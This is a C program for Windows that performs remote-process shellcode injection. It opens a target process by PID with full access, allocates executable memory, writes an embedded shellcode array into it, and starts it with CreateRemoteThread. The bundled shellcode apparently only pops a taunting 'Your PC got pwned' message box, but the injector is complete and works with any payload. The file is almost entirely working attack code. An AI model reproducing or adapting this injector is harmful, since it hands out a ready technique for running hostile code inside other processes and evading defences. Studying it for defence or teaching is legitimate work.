#include <stdio.h>
#include <windows.h>

// Initialize struactures and store them as variables set to NULL
DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

//! Shellcode payload
unsigned char vomit[] = 
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
"\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
"\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
"\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
"\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
"\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
"\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
"\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
"\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
"\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff"
"\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
"\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24"
"\x52\xe8\x5f\xff\xff\xff\x68\x58\x20\x20\x20\x68\x64\x20"
"\x3a\x33\x68\x70\x77\x6e\x65\x68\x67\x6f\x74\x20\x68\x20"
"\x50\x43\x20\x68\x59\x6f\x75\x72\x31\xdb\x88\x5c\x24\x14"
"\x89\xe3\x68\x6e\x58\x20\x20\x68\x65\x61\x73\x6f\x68\x20"
"\x61\x20\x72\x68\x20\x66\x6f\x72\x68\x68\x65\x72\x65\x68"
"\x27\x73\x20\x74\x68\x2c\x20\x69\x74\x68\x72\x20\x6f\x6e"
"\x68\x65\x6e\x64\x65\x68\x20\x44\x65\x66\x68\x64\x6f\x77"
"\x73\x68\x20\x57\x69\x6e\x68\x54\x75\x72\x6e\x31\xc9\x88"
"\x4c\x24\x31\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31"
"\xc0\x50\xff\x55\x08";


int main(int argc, char* argv[]) {

    // If the program is called with insufficient arguments, inform the user how to run this executable
    if (argc < 2) {

        printf("\n(*) Usage:\n\tshot.exe <PID> | open handle to process\n\tshot.exe | shows usage menu\n\n");

        return 0;
    }

    // Convert PID string to an integer
    PID = atoi(argv[1]);

    // If PID input is invalid
    if (PID == 0) {

        printf("\n[-] Invalid PID | PID returned 0\n\t(Error: %ld)\n\tFor usage, try: shot.exe\n\n", GetLastError());
        
        return 1;
    }

    // Inform user the argument was successful and that the program is attempting to open a handle to the process
    printf("\n[~] Attempting to open a handle to process (PID: %ld)\n", PID);

    // Open a handle to the process and store it in the process handle
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // Desired access
        FALSE, // Handle inheritance
        PID // Process ID
    );

    // If hProcess returns NULL, inform user and display the last error, then exit with failure
    if (hProcess == NULL) {

        printf("\n[-] Failed to open handle to the process (PID: %ld)\n\t(Error: %ld)\n\n", PID, GetLastError());

        return 1;
    } else {

        printf("\n[+] Handle to process opened\n\tPID: %ld\n\tHANDLE: 0x%p\n", PID, hProcess); // If not, inform the user of success and provide information about the process

    }

    // Allocate bytes to process memory and store it in the buffer
    rBuffer = VirtualAllocEx(
        hProcess, // Process handle
        NULL, // Base address specification
        sizeof(vomit), // Size allocated
        MEM_COMMIT | MEM_RESERVE, // Type of memory allocation
        PAGE_EXECUTE_READWRITE // Memory permissions
    );

    // Inform user details of rBuffer
    printf("\n[~] Allocating %zu bytes with rwx permissions\n", sizeof(vomit));


    // Attempt to write the allocated memory to process memory, inform user and exit with failure if writing fails
    if(!WriteProcessMemory(
        hProcess, // Process handle
        rBuffer, // Base address specification
        vomit, // Shell code
        sizeof(vomit), // Size of shell code
        NULL // Pointer for size of shell code
    )){

        printf("\n[-] Failed to write to process memory\n\t(Error: %ld)\n\n", GetLastError()); 

        return 1;
    } else {

        printf("\n[+] Wrote to process memory\n\tPID: %ld\n\tHANDLE: 0x%p\n\tBYTES: %zu bytes\n", PID, hProcess, sizeof(vomit)); // If successful, inform user

    }

    // Create thread to run waywode and save it to the thread handle
    hThread = CreateRemoteThread(
        hProcess, // Process handle
         NULL, // Security descriptor
         0, // Size for executable
         (LPTHREAD_START_ROUTINE)rBuffer, 
         NULL, // Starting address of thread 
         0, // Varibale to store start address 
         &TID // Time to run
         );

    // Check if thread was created successfully, inform user of outcome
    if (hThread == NULL){

        printf("\n[-] Failed to get a handle to the thread, closing process handle\n\tPID: %ld\n\tHANDLE: 0x%p\n\t(Error: %ld)\n\n", PID, hProcess, GetLastError());

        CloseHandle(hProcess); // Close the handle to the process if thread handle could not be created

        return 1;
    } /*else {

        printf("\n[+] Handle to thread created\n\tPID: %ld\n\tPROCESS HANDLE: 0x%p\n\tTID: %ld\n\tTHREAD HANDLE: 0x%p", PID, hProcess, TID, hThread); 

    }*/

    // Wait for application to close
    WaitForSingleObject(hThread, INFINITE);

    //Clean up and inform user
    printf("\nCleaning up...\n");
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("\nCleaning finished\n\n");

    return 0;
}